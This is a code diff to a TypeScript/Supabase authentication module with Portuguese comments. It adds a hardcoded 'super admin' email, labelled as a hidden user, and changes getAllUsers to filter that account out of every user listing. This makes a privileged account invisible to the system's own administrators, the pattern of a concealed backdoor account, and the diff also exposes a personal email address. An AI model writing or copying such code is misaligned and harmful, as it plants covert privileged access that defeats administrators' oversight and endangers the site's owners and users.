@@ -2,6 +2,9 @@ import { supabase, supabaseAdmin } from './supabase'
 import { User, AuthUser, LoginFormData, UserFormData } from '../types/database'
 import { validatePasswordStrength, isValidPassword } from './password-utils'
 
+// Email do super administrador (usuário oculto)
+const SUPER_ADMIN_EMAIL = 'robgomez.sir@live.com'
+
 // Função auxiliar para verificar se email existe no sistema
 async function checkIfEmailExists(email: string): Promise<boolean> {
   try {
@@ -221,7 +224,12 @@ export async function getAllUsers(): Promise<User[]> {
       throw new Error(error.message)
     }
 
-    return users || []
+    // Filtrar usuários ocultos (super admin)
+    const visibleUsers = (users || []).filter(user => 
+      user.email !== SUPER_ADMIN_EMAIL
+    )
+
+    return visibleUsers
   } catch (error) {
     console.error('Erro ao listar usuários:', error)
     throw error
